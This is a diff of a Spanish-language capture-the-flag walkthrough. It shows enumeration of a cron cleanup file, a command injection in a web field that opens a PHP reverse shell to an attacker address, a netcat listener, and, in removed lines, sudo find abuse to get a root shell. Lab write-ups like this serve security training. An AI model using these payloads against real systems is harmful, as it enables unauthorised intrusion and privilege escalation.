@@ -116,18 +116,23 @@ No vemos nada, vamos a mirar las tareas cron.
 
 ```
 <img width="1434" height="901" alt="11cron" src="https://github.com/user-attachments/assets/6e6abbf5-4eac-489a-b8d1-2c5786441d9a" />
-
 <br><br>
+
+Miramos que contiene ese fichero cleanup y también vamos a mirar que permisos tiene.
+<img width="1438" height="864" alt="cleanup" src="https://github.com/user-attachments/assets/81b4167c-f70c-45d7-a167-e376a5da64ae" />
+<img width="1355" height="916" alt="permisoscleanup" src="https://github.com/user-attachments/assets/b120df1d-aa4e-42e0-a594-da59ad6788d9" />
+
+Vamos a proceder a realizar una reverse shell para poder trabjar más ocmodamente.
 
 
 ### Intrusión (Reverse Shell)
-Logramos ejecutar comandos en el sistema y establecemos una *reverse shell* hacia nuestra máquina atacante:
+Establecemos una *reverse shell* hacia nuestra máquina atacante:
 
 ```php
 # Comando ejecutado en el navegador web
 127.0.0.1; php -r '$sock=fsockopen("172.17.0.1",440);exec("/bin/bash <&3 >&3 2>&3");'
 ```
-
+<img width="1436" height="904" alt="revel" src="https://github.com/user-attachments/assets/13f6b506-7ae6-470e-bd11-2cf366601985" />
 <br><br>
 
 
@@ -136,6 +141,7 @@ Ponemos nuestro *netcat* a la escucha para recibir la conexión:
 sudo nc -lvnp 440
 ```
 
+<img width="723" height="88" alt="nc" src="https://github.com/user-attachments/assets/1dc57619-3557-4fcb-bff1-31912973d5ea" />
 <br><br>
 
 Ya somos el usuario web-admin desde una terminal, ahora podemos sanitizarla o continuar así, se ve peor pero como anteriormente vimos que con sudo -l podíamos ejecutar find sin contraseña como el usuario root, vamos a escalar privilegios.
@@ -154,25 +160,27 @@ export TERM=xterm
 
 ### Enumeración del Sistema
 
-```bash
-# Comprobamos privilegios de SUDO
-sudo -l
-```
+
+<img width="1716" height="503" alt="establecido" src="https://github.com/user-attachments/assets/b4d33ec9-659b-4fdd-a412-438532918088" />
+<br><br>
+Estamos dentro, 
+<img width="785" height="239" alt="revisar" src="https://github.com/user-attachments/assets/c19c3461-39f8-4d3c-b834-0c92cfef203b" />
+<br><br>
+
 ---
 
 ### Explotación del Vector de Escalada
 
-Nos aprovechamos del permiso SUID que tenemos para ejecutar find sin contraseña y como el usuario root para convertirnos en él.
-
-```bash
-sudo find . -exec /bin/sh \; -quit
-```
-
+<img width="213" height="89" alt="1" src="https://github.com/user-attachments/assets/2728044c-16f7-476b-98ec-faef36635cb8" />
 <br><br>
 
-
+<img width="403" height="166" alt="2" src="https://github.com/user-attachments/assets/f393163f-1c75-42f9-a54c-d507d91b51df" />
+<br><br>
 ¡Ya somos **root**! 🚩 Buscamos la flag en la carpeta personal de root.
 
 <br><br>
 
 Por último, validamos la flag obtenida.
+
+<img width="795" height="450" alt="3" src="https://github.com/user-attachments/assets/0544039d-0c31-4ea5-97da-edbeabd7c177" />
+<br><br>
